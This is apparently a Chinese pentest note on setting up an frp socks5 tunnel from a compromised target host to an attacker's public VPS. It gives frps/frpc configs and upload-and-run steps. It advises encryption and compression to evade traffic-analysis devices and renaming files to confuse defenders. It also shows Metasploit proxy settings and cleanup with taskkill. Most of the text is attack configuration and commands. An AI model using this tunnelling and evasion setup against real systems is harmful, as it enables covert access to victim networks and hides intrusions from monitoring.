	https://github.com/fatedier/frp/releases/
	使用条件:目标主机通外网，拥有自己的公网ip
	对攻击机外网服务端frps.ini进行配置
	[common]
	bind_port=8080
	靶机客户端
	[common]
	server_addr=服务器端外网IP
	server_port=8080
	[socks5]
	type=tcp
	remote_port=12345
	plugin=socks5
	use_encryption=true
	use_compression=true
	以上是启用加密和压缩，能躲避流量分析设备。
	上传frpc.exe和frpc.ini到目标服务器上,直接运行frpc.exe（在实战中可能会提示找不到配置文件，需要使用-c参数指定配置文件的路径frpc.exe -c 文件路径），可以修改文件名和配置名以混淆视听。
	公网vps主机上运行./frps –c frps.ini
	靶机执行./frpc –c frpc.ini
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/347.png)

	MSF中设置全局变量
	>setg proxies 公网IP:12345
	>setg ReverseAllowProxy true 运行反向代理
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/348.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/349.png)

	结束攻击
	tasklist 
	taskkill /pid 进程号 -t –f
